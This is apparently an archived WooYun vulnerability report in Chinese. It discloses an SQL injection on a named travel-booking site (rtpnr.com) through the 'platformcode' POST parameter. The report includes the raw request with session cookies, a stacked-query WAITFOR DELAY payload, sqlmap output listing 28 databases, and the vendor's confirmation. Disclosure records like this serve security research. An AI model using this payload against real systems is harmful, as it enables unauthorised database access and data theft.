wybug_title: 中航易购某站存在SQL注入漏洞
wybug_detail:
漏洞详情 披露状态：   									2015-12-20：	细节已通知厂商并且等待厂商处理中									2015-12-21：	厂商已经确认，细节仅向厂商公开									2015-12-31：	细节向核心白帽子及相关领域专家公开									2016-01-10：	细节向普通白帽子公开									2016-01-20：	细节向实习白帽子公开									2016-02-01：	细节向公众公开  简要描述：  详细说明：  
POST /NewEdition/PlatformIntroduce/PlatformIntroduceMasterPlate.aspx HTTP/1.1Content-Length: 75Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: http://rtpnr.comCookie: ASP.NET_SessionId=34hcrf55jd4uqtb3svdugour; CheckCode=9122; Hm_lvt_6a6eed5fb68938503f53da6222456e44=1450374283,1450374304,1450374498,1450374540; Hm_lpvt_6a6eed5fb68938503f53da6222456e44=1450374540; IESESSION=alive; HMACCOUNT=FF81BD2B63519056; pgv_pvi=3126991872; pgv_si=s3309262848Host: rtpnr.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21Accept: */*platformcode=p&Type=GetHotLine
   漏洞证明：  
sqlmap resumed the following injection point(s) from stored session:---Parameter: platformcode (POST)    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: platformcode=p';WAITFOR DELAY '0:0:5'--&Type=GetHotLine---web server operating system: Windows 2008 R2 or 7web application technology: Microsoft IIS 7.5, ASP.NET, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008available databases [28]:[*] [ATSLog\x03][*] ATS[*] AutoTicket[*] BACKUP[*] distribution[*] master[*] model[*] MonitorBlocking[*] msdb[*] Temp2015[*] tempdb[*] tslwp[*] YeeGo_BackUp[*] YeeGo_History[*] YeeGo_Order[*] YeeGoCopy[*] YeeGoLog[*] YeeGoTemp[*] YeeGoUser[*] YeeSkyBillings[*] YeeSkyGo[*] YeeSkyGo_TEST[*] YeeSkyGoLog[*] YeeSkyGoLog_History[*] Yeesoho_test[*] YSK_SAAS[*] YSK_SAAS_History[*] YSK_SAAS_TEST
   修复方案：     版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-12-21 16:10 厂商回复： 感谢！ 最新状态： 暂无
